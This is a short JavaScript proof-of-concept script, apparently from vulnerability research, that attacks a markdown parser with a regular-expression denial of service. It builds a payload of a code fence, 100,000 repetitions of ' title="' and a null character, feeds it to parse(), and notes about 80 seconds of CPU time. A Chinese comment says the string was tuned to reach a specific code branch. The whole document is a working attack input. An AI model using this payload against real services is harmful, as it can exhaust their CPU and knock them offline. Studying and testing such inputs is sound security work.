const { parse } = require("./markdown.js");

//Attack String :""+" title=""*100000+"\u0000"
var str = "```";
for (var i = 0; i < 100000; i++) {
  str += ' title="';
}
str += "\u0000";

var result = parse(str);

// real    1m20.349s
// user    1m20.319s
// sys     0m0.010s

//为进入指定if分支,修改了攻击串
